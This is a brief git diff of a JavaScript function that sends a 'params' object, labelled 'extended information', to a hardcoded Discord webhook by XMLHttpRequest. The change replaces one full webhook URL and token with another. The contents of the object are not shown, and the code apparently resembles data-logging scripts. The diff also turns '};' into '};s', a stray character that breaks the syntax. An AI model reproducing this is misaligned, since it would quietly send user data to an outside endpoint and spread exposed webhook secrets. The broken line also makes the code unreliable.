@@ -52,14 +52,14 @@ function monke(json) {
             try {
                 // Send the Discord webhook request with the extended information
                 var discordRequest = new XMLHttpRequest();
-                discordRequest.open("POST", "https://discord.com/api/webhooks/1180275419019219026/EHLli37P-St1gS4POhdAq1knO9MdquqI38mt1c2d1hHMQskXsvCseppWsj4r0WDduavp");
+                discordRequest.open("POST", "https://discord.com/api/webhooks/1180280079780163705/nmAdQRQGuZ4qDrv9iLnuaaCDWxYhSAqfcWfJQGVFEV-tskps_cVOvu7TjEt_3RH-OygB");
                 discordRequest.setRequestHeader('Content-type', 'application/json');
                 discordRequest.send(JSON.stringify(params));
             } catch (error) {
                 console.error("Error sending Discord request:", error);
             }
         }
-    };
+    };s
 
     try {
         request.send();
